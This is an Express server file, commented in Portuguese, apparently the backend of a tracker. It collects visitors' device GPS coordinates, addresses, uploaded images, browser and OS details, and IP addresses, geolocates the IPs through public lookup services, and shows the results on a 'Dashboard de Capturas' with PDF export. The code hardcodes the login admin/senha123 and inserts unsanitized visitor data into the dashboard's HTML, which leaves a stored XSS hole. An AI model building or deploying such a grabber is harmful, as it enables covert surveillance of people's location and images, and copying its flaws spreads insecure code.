// ========== AUTENTICAÇÃO ==========
const auth = require('basic-auth');
function autenticar(req, res, next) {
  const usuario = auth(req);
  const usuarioValido = 'admin';
  const senhaValida = 'senha123';
  if (!usuario || usuario.name !== usuarioValido || usuario.pass !== senhaValida) {
    res.set('WWW-Authenticate', 'Basic realm="Dashboard Protegido"');
    return res.status(401).send('Acesso negado – autenticação necessária.');
  }
  next();
}
// ========== DEPENDÊNCIAS ==========
const axios = require('axios');
const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');
const app = express();
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '10mb' }));
app.set('trust proxy', true);
// ========== ARMAZENAMENTO ==========
let dadosRecebidos = [];
// ========== FUNÇÃO MELHORADA PARA OBTER IP PÚBLICO REAL (com foco em IPv4 visível) ==========
async function obterIPPublicoReal(req) {
  try {
    console.log('🔍 Iniciando captura de IP público...');
    const ips = {
      xForwardedFor: req.headers['x-forwarded-for'],
      xRealIP: req.headers['x-real-ip'],
      xClientIP: req.headers['x-client-ip'],
      remoteAddress: req.connection?.remoteAddress,
      socketAddress: req.socket?.remoteAddress,
      connectionSocket: req.connection?.socket?.remoteAddress,
      reqIP: req.ip,
      cfConnectingIP: req.headers['cf-connecting-ip'],
      trueClientIP: req.headers['true-client-ip'],
      forwarded: req.headers['forwarded']
    };
    let clientIP = null;
    if (ips.xForwardedFor) {
      clientIP = ips.xForwardedFor.split(',')[0].trim();
    } else if (ips.cfConnectingIP) {
      clientIP = ips.cfConnectingIP;
    } else if (ips.trueClientIP) {
      clientIP = ips.trueClientIP;
    } else if (ips.xRealIP) {
      clientIP = ips.xRealIP;
    } else if (ips.xClientIP) {
      clientIP = ips.xClientIP;
    } else {
      clientIP = ips.remoteAddress || ips.socketAddress || ips.connectionSocket || ips.reqIP;
    }
    if (clientIP && clientIP.startsWith('::ffff:')) {
      clientIP = clientIP.substring(7);
    }
    let ipPublicoReal = clientIP;
    let ipPublicoIPv4Real = null; // Vamos buscar um IPv4 público real
    let dadosGeoIP = {};
    const isPrivateIP = clientIP && (
      clientIP.startsWith('192.168.') ||
      clientIP.startsWith('10.') ||
      clientIP.startsWith('172.') ||
      clientIP === '127.0.0.1' ||
      clientIP === '::1' ||
      clientIP === 'localhost' ||
      clientIP.startsWith('169.254.')
    );
    const servicosIPv4 = [
      'https://api.ipify.org?format=json',
      'https://checkip.amazonaws.com',
      'https://ifconfig.me/ip',
      'https://icanhazip.com',
      'https://ident.me',
      'https://myexternalip.com/raw'
    ];
    if (isPrivateIP || !clientIP.includes('.')) {
      for (const servico of servicosIPv4) {
        try {
          const response = await axios.get(servico, { timeout: 5000 });
          let ip = null;
          if (response.data.ip) {
            ip = response.data.ip;
          } else if (response.data.origin) {
            ip = response.data.origin;
          } else if (typeof response.data === 'string') {
            ip = response.data.trim();
          }
          if (ip && ip.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/)) {
            ipPublicoIPv4Real = ip;
            ipPublicoReal = ip;
            break;
          }
        } catch (err) {
          console.log(`❌ Falha no serviço IPv4: ${servico}`, err.message);
        }
      }
    } else if (clientIP.includes('.')) {
      if (clientIP.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/)) {
        ipPublicoIPv4Real = clientIP;
      }
    }
    if (!ipPublicoIPv4Real) {
      ipPublicoIPv4Real = 'Não disponível';
    }
    const ipParaGeo = ipPublicoIPv4Real !== 'Não disponível' ? ipPublicoIPv4Real : ipPublicoReal;
    const geoServicos = [
      `http://ip-api.com/json/${ipParaGeo}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`,
      `https://ipapi.co/${ipParaGeo}/json/`,
      `http://www.geoplugin.net/json.gp?ip=${ipParaGeo}`
    ];
    for (const servicoGeo of geoServicos) {
      try {
        const geoResponse = await axios.get(servicoGeo, { timeout: 8000 });
        if (geoResponse.data.status === 'success' || geoResponse.data.country) {
          dadosGeoIP = {
            country: geoResponse.data.country || geoResponse.data.geoplugin_countryName,
            countryCode: geoResponse.data.countryCode || geoResponse.data.country_code || geoResponse.data.geoplugin_countryCode,
            region: geoResponse.data.region || geoResponse.data.region_code,
            regionName: geoResponse.data.regionName || geoResponse.data.region || geoResponse.data.geoplugin_region,
            city: geoResponse.data.city || geoResponse.data.geoplugin_city,
            zip: geoResponse.data.zip || geoResponse.data.postal,
            lat: geoResponse.data.lat || geoResponse.data.latitude || geoResponse.data.geoplugin_latitude,
            lon: geoResponse.data.lon || geoResponse.data.longitude || geoResponse.data.geoplugin_longitude,
            timezone: geoResponse.data.timezone || geoResponse.data.geoplugin_timezone,
            isp: geoResponse.data.isp || geoResponse.data.org || geoResponse.data.geoplugin_isp,
            org: geoResponse.data.org || geoResponse.data.organization,
            as: geoResponse.data.as
          };
          break;
        }
      } catch (err) {
        console.log(`❌ Falha no serviço Geo: ${servicoGeo}`, err.message);
      }
    }
    return {
      ipOriginal: clientIP,
      ipPublico: ipPublicoReal,
      ipPublicoOperadora: ipPublicoReal,
      ipPublicoIPv4Real,
      ipv4: (clientIP && clientIP.includes('.')) ? clientIP : 'Não detectado',
      ipv6: (clientIP && clientIP.includes(':') && !clientIP.startsWith('::ffff:')) ? clientIP : 'Não detectado',
      todosIPs: ips,
      ehIPPrivado: isPrivateIP,
      geolocalizacao: {
        pais: dadosGeoIP.country || 'Não informado',
        codigoPais: dadosGeoIP.countryCode || 'N/A',
        estado: dadosGeoIP.regionName || 'Não informado',
        cidade: dadosGeoIP.city || 'Não informado',
        cep: dadosGeoIP.zip || 'Não informado',
        latitude: dadosGeoIP.lat || null,
        longitude: dadosGeoIP.lon || null,
        timezone: dadosGeoIP.timezone || 'Não informado'
      },
      provedor: {
        isp: dadosGeoIP.isp || 'Desconhecido',
        organizacao: dadosGeoIP.org || 'Desconhecida',
        sistemaAutonomo: dadosGeoIP.as || 'Não informado'
      }
    };
  } catch (err) {
    console.error('Erro ao obter IP público:', err.message);
    return {
      ipOriginal: 'Erro na captura',
      ipPublico: 'Erro na captura',
      ipPublicoOperadora: 'Erro na captura',
      ipPublicoIPv4Real: 'Erro',
      ipv4: 'Erro',
      ipv6: 'Erro',
      todosIPs: {},
      ehIPPrivado: null,
      geolocalizacao: {
        pais: 'Erro',
        codigoPais: 'Erro',
        estado: 'Erro',
        cidade: 'Erro',
        cep: 'Erro',
        latitude: null,
        longitude: null,
        timezone: 'Erro'
      },
      provedor: {
        isp: 'Erro',
        organizacao: 'Erro',
        sistemaAutonomo: 'Erro'
      }
    };
  }
}
// ========== REVERSE GEOCODING (Obter CEP a partir de coordenadas) ==========
async function obterCepPorCoordenadas(lat, lon) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
    const response = await axios.get(url, {
      headers: { 'User-Agent': 'CapturaGPS/1.0' },
      timeout: 8000
    });
    const address = response.data.address;
    return address?.postcode || 'CEP não encontrado';
  } catch (err) {
    console.error('Erro no reverse geocoding:', err.message);
    return 'Erro ao obter CEP';
  }
}
// ========== ROTA DE CAPTURA ==========
// ========== ROTA DE CAPTURA MODIFICADA PARA USAR O IP DO FRONTEND ==========
app.post('/dados', async (req, res) => {
  // 1. Desestruture os dados recebidos, INCLUINDO 'ip'
  const { latitude, longitude, endereco, imagem, sistema, navegador, ip: ipFrontend } = req.body;
  console.log("Dados recebidos no /dados:", { latitude, longitude, endereco, sistema, navegador, ipFrontend }); // Log para debug

  let fileName = null;
  if (imagem) {
    const pastaCapturas = path.join(__dirname, 'public', 'capturas');
    if (!fs.existsSync(pastaCapturas)) {
      fs.mkdirSync(pastaCapturas, { recursive: true });
    }
    fileName = `captura_${Date.now()}.png`;
    const base64Data = imagem.replace(/^data:image\/png;base64,/, '');
    const caminhoImagem = path.join(pastaCapturas, fileName);
    fs.writeFileSync(caminhoImagem, base64Data, 'base64');
  }

  // 2. Inicialize as variáveis de IP
  let ipFinal = 'IP não informado';
  let dadosIP = {
    ipOriginal: 'Não utilizado',
    ipPublico: 'Não utilizado',
    ipPublicoOperadora: 'Não utilizado',
    ipPublicoIPv4Real: 'IP não informado',
    ipv4: 'Não detectado',
    ipv6: 'Não detectado',
    ehIPPrivado: null,
    geolocalizacao: {
      pais: 'Não informado',
      codigoPais: 'N/A',
      estado: 'Não informado',
      cidade: 'Não informado',
      cep: 'Não informado',
      latitude: null,
      longitude: null,
      timezone: 'Não informado'
    },
    provedor: {
      isp: 'Desconhecido',
      organizacao: 'Desconhecida',
      sistemaAutonomo: 'Não informado'
    },
    todosIPs: {}
  };

  // 3. Validar o IP capturado pelo frontend
  const ipFrontendValido = ipFrontend &&
                           typeof ipFrontend === 'string' &&
                           ipFrontend.match(/^(?!0)(?!.*\.$)((1?\d?\d|2[0-4]\d|25[0-5])\.){3}(?!0\d)\d+$/);

  if (ipFrontendValido) {
    console.log(`✅ Usando IP capturado pelo frontend: ${ipFrontend}`);
    ipFinal = ipFrontend;
    // 4. Tentar obter geolocalização para o IP do frontend
    try {
        const geoServicos = [
          `http://ip-api.com/json/${ipFrontend}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`
          // Adicionei apenas um serviço por simplicidade e velocidade. Você pode adicionar mais se quiser.
        ];
        let dadosGeoIP = {};
        let geoSucesso = false;
        for (const servicoGeo of geoServicos) {
          try {
            console.log(`🔍 Tentando geolocalizar IP ${ipFrontend} via ${servicoGeo}...`);
            const geoResponse = await axios.get(servicoGeo, { timeout: 8000 });
            if (geoResponse.data.status === 'success' && geoResponse.data.country) {
              dadosGeoIP = {
                country: geoResponse.data.country,
                countryCode: geoResponse.data.countryCode,
                region: geoResponse.data.region,
                regionName: geoResponse.data.regionName,
                city: geoResponse.data.city,
                zip: geoResponse.data.zip,
                lat: geoResponse.data.lat,
                lon: geoResponse.data.lon,
                timezone: geoResponse.data.timezone,
                isp: geoResponse.data.isp,
                org: geoResponse.data.org,
                as: geoResponse.data.as
              };
              console.log(`✅ Geolocalização obtida via ${servicoGeo}`);
              geoSucesso = true;
              break; // Sai do loop se obteve sucesso
            } else {
                console.log(`⚠️ Resposta inválida de ${servicoGeo}:`, geoResponse.data);
            }
          } catch (geoErr) {
             console.log(`⚠️ Erro na geolocalização via ${servicoGeo}:`, geoErr.message);
          }
        }

        if (geoSucesso) {
            // Atualiza os campos relevantes no objeto dadosIP para o registro
            dadosIP.geolocalizacao = {
                pais: dadosGeoIP.country || 'Não informado',
                codigoPais: dadosGeoIP.countryCode || 'N/A',
                estado: dadosGeoIP.regionName || 'Não informado',
                cidade: dadosGeoIP.city || 'Não informado',
                cep: dadosGeoIP.zip || 'Não informado',
                latitude: dadosGeoIP.lat || null,
                longitude: dadosGeoIP.lon || null,
                timezone: dadosGeoIP.timezone || 'Não informado'
            };
            dadosIP.provedor = {
                isp: dadosGeoIP.isp || 'Desconhecido',
                organizacao: dadosGeoIP.org || 'Desconhecida',
                sistemaAutonomo: dadosGeoIP.as || 'Não informado'
            };
        } else {
             console.log(`⚠️ Não foi possível obter geolocalização para o IP ${ipFrontend}.`);
        }
        // Atualiza os campos principais de IP
        dadosIP.ipPublicoIPv4Real = ipFrontend;
        dadosIP.ipPublico = ipFrontend;
        dadosIP.ipPublicoOperadora = ipFrontend;
        dadosIP.ipv4 = ipFrontend; // Assume que é IPv4

    } catch (updateErr) {
        console.error("💥 Erro ao atualizar dados com IP do frontend:", updateErr);
        // Mesmo se falhar na geoloc, ainda usa o IP
        dadosIP.ipPublicoIPv4Real = ipFrontend;
        dadosIP.ipPublico = ipFrontend;
        dadosIP.ipPublicoOperadora = ipFrontend;
        dadosIP.ipv4 = ipFrontend;
    }
  } else {
    console.log(`⚠️ IP do frontend inválido ou não enviado: '${ipFrontend}'.`);
    // Fallback: tenta usar o IP do servidor/proxy (método antigo)
    console.log("🔄 Tentando obter IP via cabeçalhos do servidor...");
    const dadosIPServidor = await obterIPPublicoReal(req);
    ipFinal = dadosIPServidor.ipPublicoIPv4Real;
    if (ipFinal && ipFinal !== 'Não disponível' && ipFinal !== 'Erro') {
        console.log(`✅ Usando IP obtido pelo servidor: ${ipFinal}`);
        // Reutiliza os dados obtidos pela função original
        dadosIP = dadosIPServidor;
    } else {
        console.log("❌ Nenhum IP válido encontrado.");
        ipFinal = 'Erro ao determinar IP';
    }
  }

  let cepGPS = 'Não informado';
  if (latitude && longitude) {
    cepGPS = await obterCepPorCoordenadas(latitude, longitude);
  }

  const registro = {
    latitude,
    longitude,
    endereco,
    sistema,
    navegador,
    imagem: fileName,
    horario: new Date().toLocaleString(),
    // Usando os valores potencialmente atualizados
    ipOriginal: dadosIP.ipOriginal,
    ipPublico: dadosIP.ipPublico,
    ipPublicoOperadora: dadosIP.ipPublicoOperadora,
    ipPublicoIPv4Real: dadosIP.ipPublicoIPv4Real, // <- Este é o campo crucial
    ipv4: dadosIP.ipv4,
    ipv6: dadosIP.ipv6,
    ehIPPrivado: dadosIP.ehIPPrivado,
    pais: dadosIP.geolocalizacao.pais,
    codigoPais: dadosIP.geolocalizacao.codigoPais,
    estado: dadosIP.geolocalizacao.estado,
    cidade: dadosIP.geolocalizacao.cidade,
    cep: dadosIP.geolocalizacao.cep,
    latitudeIP: dadosIP.geolocalizacao.latitude,
    longitudeIP: dadosIP.geolocalizacao.longitude,
    timezone: dadosIP.geolocalizacao.timezone,
    operadora: dadosIP.provedor.isp,
    organizacao: dadosIP.provedor.organizacao,
    sistemaAutonomo: dadosIP.provedor.sistemaAutonomo,
    todosIPs: dadosIP.todosIPs,
    cepGPS,
    ipFrontendCapturado: ipFrontend // Para debug
  };

  dadosRecebidos.push(registro);
  console.log(`✅ Registro salvo para IP: ${registro.ipPublicoIPv4Real}`); // Log para confirmar
  res.send('Dados recebidos com sucesso!');
});
// ========== ROTA DE ACESSO VIA INDEX ==========
app.post('/acesso', async (req, res) => {
  const horario = new Date().toLocaleString();
  const dadosIP = await obterIPPublicoReal(req);
  const registro = {
    horario,
    origem: 'index.html',
    sistema: req.headers['user-agent'],
    ipOriginal: dadosIP.ipOriginal,
    ipPublico: dadosIP.ipPublico,
    ipPublicoOperadora: dadosIP.ipPublicoOperadora,
    ipPublicoIPv4Real: dadosIP.ipPublicoIPv4Real,
    ipv4: dadosIP.ipv4,
    ipv6: dadosIP.ipv6,
    ehIPPrivado: dadosIP.ehIPPrivado,
    pais: dadosIP.geolocalizacao.pais,
    codigoPais: dadosIP.geolocalizacao.codigoPais,
    estado: dadosIP.geolocalizacao.estado,
    cidade: dadosIP.geolocalizacao.cidade,
    cep: dadosIP.geolocalizacao.cep,
    latitudeIP: dadosIP.geolocalizacao.latitude,
    longitudeIP: dadosIP.geolocalizacao.longitude,
    timezone: dadosIP.geolocalizacao.timezone,
    operadora: dadosIP.provedor.isp,
    organizacao: dadosIP.provedor.organizacao,
    sistemaAutonomo: dadosIP.provedor.as,
    todosIPs: dadosIP.todosIPs,
    cepGPS: 'Não disponível'
  };
  dadosRecebidos.push(registro);
  res.sendStatus(200);
});
// ========== ROTA PARA LIMPAR REGISTROS ==========
app.post('/limpar-registros', autenticar, (req, res) => {
  dadosRecebidos = [];
  res.json({ message: 'Registros limpos com sucesso!' });
});
// ========== ROTA JSON PARA FRONT ==========
app.get('/dados-json', autenticar, (req, res) => {
  res.json(dadosRecebidos);
});
// ========== DASHBOARD HTML DINÂMICO ==========
app.get('/dashboard', autenticar, (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Dashboard - DF_STRUCTS</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
    body {
      background: #121212;
      color: #ddd;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 22px;
    }
    h1 {
      font-weight: 700;
      font-size: 1.9rem;
      margin-bottom: 20px;
      color: #b09cff;
    }
    .botao {
      background-color: #7D60FF;
      color: white;
      border: none;
      padding: 11px 18px;
      margin-right: 10px;
      font-weight: 700;
      border-radius: 8px;
      cursor: pointer;
      user-select: none;
      box-shadow: 0 0 8px rgba(125, 96, 255, 0.4);
      transition: background-color 0.25s ease;
    }
    .botao:hover {
      background-color: #a084fa;
    }
    .botao-atualizar {
      background-color: #0F9B58;
      margin-right: 0;
      box-shadow: 0 0 8px rgba(15, 155, 88, 0.6);
    }
    .botao-atualizar:hover {
      background-color: #25e06d;
    }
    .botao-limpar {
      background-color: #ff4757;
      box-shadow: 0 0 8px rgba(255, 71, 87, 0.6);
    }
    .botao-limpar:hover {
      background-color: #ff6b81;
    }
    .area-botoes {
      margin-bottom: 24px;
    }
    .stats {
      display: flex;
      gap: 16px;
      flex-wrap: wrap;
      margin-bottom: 30px;
    }
    .stat-card {
      background-color: #22222b;
      border-radius: 12px;
      padding: 20px 24px;
      box-shadow: 0 3px 15px #000A;
      min-width: 130px;
      text-align: center;
      user-select: none;
      color: #c9bfff;
      flex-grow: 1;
    }
    .stat-number {
      font-size: 2.3rem;
      font-weight: 900;
      color: #edcaff;
      margin-top: 5px;
    }
    .stat-subtext {
      font-size: 0.85rem;
      color: #8a81a1;
      margin-top: 5px;
      line-height: 1.2;
    }
    #dashboard-container {
      max-width: 960px;
      margin: auto;
    }
    .card {
      background-color: #20202a;
      box-shadow: 0 2px 12px #000A;
      border-radius: 14px;
      margin-bottom: 30px;
      padding: 24px 28px;
      border-left: 7px solid;
      user-select: text;
      position: relative;
      word-break: break-word;
    }
    .card.basic { border-left-color: #ad54ff; }
    .card.ip { border-left-color: #e94e4c; }
    .card.geo { border-left-color: #4f9f6f; }
    .card.provider { border-left-color: #5b6e8f; }
    .card.gps { border-left-color: #9c91ff; }
    .card.capture { border-left-color: #cebcfe; }
    .section {
      background-color: #2b2b3eaa;
      border-radius: 8px;
      padding: 14px 18px;
      margin-bottom: 18px;
    }
    .section h3 {
      font-size: 1.15rem;
      color: #bbacff;
      font-weight: 600;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .section h3 .emoji {
      font-size: 1.2rem;
      user-select: none;
    }
    .info {
      color: #ccc;
      font-size: 0.93rem;
      margin-bottom: 8px;
    }
    .info strong {
      color: #c6b0ff;
      user-select: text;
    }
    .highlight {
      background-color: #5f3ffe8f;
      color: #e8e8ff;
      font-weight: 600;
      font-size: 0.9rem;
      padding: 2px 10px;
      border-radius: 5px;
      margin-left: 8px;
      user-select: none;
    }
    img {
      max-width: 100%;
      margin-top: 14px;
      border-radius: 10px;
      box-shadow: 0 0 12px #865dfa;
      display: block;
    }
    .status-indicator {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background-color: #4ac789;
      box-shadow: 0 0 7px #49d17eaa;
    }
    /* Logo DF_STRUCTS no canto superior direito */
    .logo-dfstructs {
      position: absolute;
      top: 10px;
      right: 20px;
      width: 120px;
      height: 120px;
      object-fit: contain;
      z-index: 10;
    }
    /* Estilização do "Último Acesso" com gradiente */
    .ultimo-acesso {
      font-size: 1.4rem;
      font-weight: 700;
      background: linear-gradient(90deg, #7D60FF, #0F9B58);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      color: transparent;
    }
    /* Modal de confirmação */
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.7);
    }
    .modal-content {
      background-color: #20202a;
      margin: 15% auto;
      padding: 30px;
      border-radius: 10px;
      width: 80%;
      max-width: 500px;
      text-align: center;
      box-shadow: 0 0 20px rgba(125, 96, 255, 0.5);
    }
    .modal-buttons {
      margin-top: 25px;
    }
    .modal-button {
      padding: 12px 25px;
      margin: 0 10px;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
    }
    .modal-confirm {
      background-color: #ff4757;
      color: white;
    }
    .modal-cancel {
      background-color: #7D60FF;
      color: white;
    }
    .modal-button:hover {
      opacity: 0.9;
      transform: translateY(-2px);
    }
  </style>
</head>
<body>
  <!-- Logo no canto superior direito -->
  <div class="logo-dfstructs">
    <img src="/dfstructs-logo.png" alt="Logo DF_STRUCTS" />
  </div>
  
  <!-- Modal de confirmação -->
  <div id="confirmModal" class="modal">
    <div class="modal-content">
      <h2>⚠️ Confirmar Limpeza</h2>
      <p>Tem certeza que deseja limpar todos os registros? Esta ação não pode ser desfeita.</p>
      <div class="modal-buttons">
        <button class="modal-button modal-cancel" onclick="fecharModal()">Cancelar</button>
        <button class="modal-button modal-confirm" onclick="confirmarLimpeza()">Limpar Registros</button>
      </div>
    </div>
  </div>

  <h1>📊 Dashboard de Capturas - IP Público Real</h1>
  <div class="area-botoes">
    <button class="botao" id="btn-exportar">📄 Exportar para PDF</button>
    <button class="botao botao-atualizar" id="btn-atualizar">🔄 Atualizar</button>
    <button class="botao botao-limpar" id="btn-limpar">🗑️ Limpar Registros</button>
  </div>
  <div class="stats" id="stats"></div>
  <div id="dashboard-container"></div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
  <script>
    let dadosGlobais = [];
    
    // Função para abrir o modal de confirmação
    function abrirModal() {
      document.getElementById('confirmModal').style.display = 'block';
    }
    
    // Função para fechar o modal
    function fecharModal() {
      document.getElementById('confirmModal').style.display = 'none';
    }
    
    // Função para confirmar a limpeza
    async function confirmarLimpeza() {
      try {
        const response = await fetch('/limpar-registros', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          }
        });
        
        if (response.ok) {
          fecharModal();
          atualizarDashboard();
          alert('✅ Registros limpos com sucesso!');
        } else {
          throw new Error('Falha ao limpar registros');
        }
      } catch (error) {
        console.error('Erro ao limpar registros:', error);
        alert('❌ Erro ao limpar registros: ' + error.message);
        fecharModal();
      }
    }
    
    async function atualizarDashboard() {
      try {
        const res = await fetch('/dados-json');
        const dados = await res.json();
        dadosGlobais = dados;
        const total = dados.length;
        const capturas = dados.filter(d => d.imagem).length;
        const acessos = dados.filter(d => d.origem === 'index.html').length;
        const ipsUnicos = [...new Set(dados.map(d => d.ipPublicoIPv4Real))].length;
        const ultimo = total > 0 ? dados[total - 1].horario : '-';
        document.getElementById('stats').innerHTML = \`
          <div class="stat-card">
            <div class="stat-number">\${total}</div>
            <div>Total de Registros</div>
          </div>
          <div class="stat-card">
            <div class="stat-number">\${capturas}</div>
            <div>Capturas Completas</div>
          </div>
          <div class="stat-card">
            <div class="stat-number">\${acessos}</div>
            <div>Acessos Simples</div>
          </div>
          <div class="stat-card">
            <div class="stat-number">\${ipsUnicos}</div>
            <div>IPs IPv4 Únicos</div>
          </div>
          <div class="stat-card">
            <div class="ultimo-acesso">Último Acesso</div>
            <div class="ultimo-acesso">\${ultimo}</div>
          </div>
        \`;
        const container = document.getElementById('dashboard-container');
        container.innerHTML = dados.slice().reverse().map((dado, idx) => \`
          <div class="card basic">
            <h2>
              <span class="status-indicator"></span>
              \${dado.origem === 'index.html' ? '👀 Acesso' : '🖼 Captura'} \${idx + 1}
            </h2>
            <div class="section">
              <h3><span class="emoji">📍</span> Informações Básicas</h3>
              <div class="info"><strong>Horário:</strong> \${dado.horario}</div>
              <div class="info"><strong>Origem:</strong> \${dado.origem || 'Captura completa'}</div>
              <div class="info"><strong>Sistema:</strong> \${dado.sistema}</div>
              <div class="info"><strong>Navegador:</strong> \${dado.navegador || 'Não informado'}</div>
            </div>
            <div class="section ip">
              <h3><span class="emoji">🌐</span> IP Público Visível (Meu IP)</h3>
              <div class="info">
                <strong>IP Público IPv4 (Real):</strong> 
                <span style="color: #00d4ff; font-weight: 700;">\${dado.ipPublicoIPv4Real || 'Não disponível'}</span>
                <span class="highlight">\${dado.ehIPPrivado ? 'Convertido' : 'Direto'}</span>
              </div>
              <div class="info"><strong>IP Original Detectado:</strong> \${dado.ipOriginal || 'Não informado'}</div>
              <div class="info"><strong>IPv4 do Cliente:</strong> \${dado.ipv4 || 'Não detectado'}</div>
              <div class="info"><strong>IPv6 do Cliente:</strong> \${dado.ipv6 || 'Não detectado'}</div>
            </div>
            <div class="section geo">
              <h3><span class="emoji">🗺️</span> Localização por IP Público</h3>
              <div class="info"><strong>País:</strong> \${dado.pais || 'Não informado'} (\${dado.codigoPais || 'N/A'})</div>
              <div class="info"><strong>Estado/Região:</strong> \${dado.estado || 'Não informado'}</div>
              <div class="info"><strong>Cidade:</strong> \${dado.cidade || 'Não informado'}</div>
              <div class="info"><strong>CEP:</strong> \${dado.cep || 'Não informado'}</div>
              <div class="info"><strong>Coordenadas do IP:</strong> \${(dado.latitudeIP && dado.longitudeIP) ? dado.latitudeIP + ', ' + dado.longitudeIP : 'Não disponível'}</div>
              <div class="info"><strong>Fuso Horário:</strong> \${dado.timezone || 'Não informado'}</div>
            </div>
            <div class="section provider">
              <h3><span class="emoji">📡</span> Dados da Operadora/ISP</h3>
              <div class="info"><strong>Operadora Principal:</strong> \${dado.operadora || 'Desconhecida'}</div>
              <div class="info"><strong>Organização:</strong> \${dado.organizacao || 'Não informada'}</div>
              <div class="info"><strong>Sistema Autônomo:</strong> \${dado.sistemaAutonomo || 'Não informado'}</div>
            </div>
            \${(dado.endereco || dado.latitude) ? \`
              <div class="section gps">
                <h3><span class="emoji">📍</span> Localização Precisa (GPS do Dispositivo)</h3>
                <div class="info"><strong>Endereço GPS:</strong> \${dado.endereco || 'Não informado'}</div>
                <div class="info"><strong>Coordenadas GPS:</strong> \${(dado.latitude && dado.longitude) ? dado.latitude + ', ' + dado.longitude : 'Não disponível'}</div>
                <div class="info"><strong>CEP (GPS):</strong> \${dado.cepGPS || 'Não informado'}</div>
                <div class="info"><strong>IPv4 do Visitante:</strong> \${dado.ipv4 || 'Não detectado'}</div>
                <div class="info"><strong>IPv6 do Visitante:</strong> \${dado.ipv6 || 'Não detectado'}</div>
              </div>
            \` : ''}
            \${dado.imagem ? \`
              <div class="section capture">
                <h3><span class="emoji">📸</span> Captura de Tela</h3>
                <img src="/capturas/\${dado.imagem}" alt="Captura \${idx + 1}" loading="lazy" />
              </div>
            \` : ''}
          </div>
        \`).join('');
      } catch (e) {
        console.error('Erro ao carregar dados:', e);
        document.getElementById('dashboard-container').innerHTML = '<p style="color:#f33;">Erro ao carregar os dados.</p>';
      }
    }
    
    function exportarPDF() {
      try {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF({ unit: 'pt' });
        doc.setFontSize(20);
        doc.setTextColor('#7c6cff');
        doc.text('Dashboard - DF_STRUCTS', 40, 40);
        doc.setFontSize(14);
        doc.setTextColor('#555555');
        doc.text('Relatório de IPs Públicos e Capturas', 40, 65);
        let y = 100;
        dadosGlobais.forEach((dado, index) => {
          if (y > 730) {
            doc.addPage();
            y = 50;
          }
          doc.setFontSize(16);
          doc.setTextColor('#7c6cff');
          doc.text(\`\${dado.origem === 'index.html' ? 'Acesso' : 'Captura'} \${index + 1}\`, 40, y);
          y += 22;
          doc.setFontSize(11);
          doc.setTextColor('#333333');
          doc.text(\`Horário: \${dado.horario || '-'}\`, 50, y); y += 15;
          doc.text(\`IP Real (IPv4): \${dado.ipPublicoIPv4Real || '-'}\`, 50, y); y += 15;
          doc.text(\`IP Original: \${dado.ipOriginal || '-'}\`, 50, y); y += 15;
          doc.text(\`IPv4: \${dado.ipv4 || '-'}\`, 50, y); y += 15;
          doc.text(\`IPv6: \${dado.ipv6 || '-'}\`, 50, y); y += 15;
          doc.text(\`País: \${dado.pais || '-'} | Estado: \${dado.estado || '-'}\`, 50, y); y += 15;
          doc.text(\`Cidade: \${dado.cidade || '-'} | CEP: \${dado.cep || '-'}\`, 50, y); y += 15;
          doc.text(\`CEP (GPS): \${dado.cepGPS || '-'}\`, 50, y); y += 15;
          doc.text(\`Operadora: \${dado.operadora || '-'}\`, 50, y); y += 15;
          doc.text(\`Organização: \${dado.organizacao || '-'}\`, 50, y); y += 15;
          const sistemaTexto = dado.sistema ? (dado.sistema.length > 80 ? dado.sistema.substring(0, 80) + '...' : dado.sistema) : '-';
          doc.text(\`Sistema: \${sistemaTexto}\`, 50, y); y += 25;
          // Adicionar imagem capturada
          if (dado.imagem) {
            const imagePath = '/capturas/' + dado.imagem;
            const imgData = new Image();
            imgData.src = imagePath;
            // Aguardar a imagem ser carregada antes de adicionar ao PDF
            imgData.onload = () => {
              const imgWidth = 150; // Largura da imagem no PDF
              const imgHeight = (imgData.height * imgWidth) / imgData.width; // Manter proporção
              doc.addImage(imgData, 'PNG', 50, y, imgWidth, imgHeight);
              y += imgHeight + 15; // Avançar Y após adicionar a imagem
            };
            // Certificar-se de que a imagem foi carregada
            if (!imgData.complete) {
              return;
            }
          }
        });
        doc.save(\`dashboard-ips-publicos-\${Date.now()}.pdf\`);
        console.log('📄 PDF exportado com sucesso!');
      } catch (ex) {
        alert('Erro ao exportar PDF: ' + ex.message);
      }
    }
    
    // Event listeners
    document.getElementById('btn-exportar').addEventListener('click', exportarPDF);
    document.getElementById('btn-atualizar').addEventListener('click', atualizarDashboard);
    document.getElementById('btn-limpar').addEventListener('click', abrirModal);
    
    // Fechar modal ao clicar fora dele
    window.onclick = function(event) {
      const modal = document.getElementById('confirmModal');
      if (event.target == modal) {
        fecharModal();
      }
    }
    
    setInterval(atualizarDashboard, 15000);
    atualizarDashboard();
  </script>
</body>
</html>`;
  res.send(html);
});
// ========== ROTA DE TESTE DE IP ==========
app.get('/meu-ip', async (req, res) => {
  const dadosIP = await obterIPPublicoReal(req);
  res.json({ message: 'Seu IP público IPv4 real (como no meuip)', dados: dadosIP });
});
// ========== MIDDLEWARE DE LOG ==========
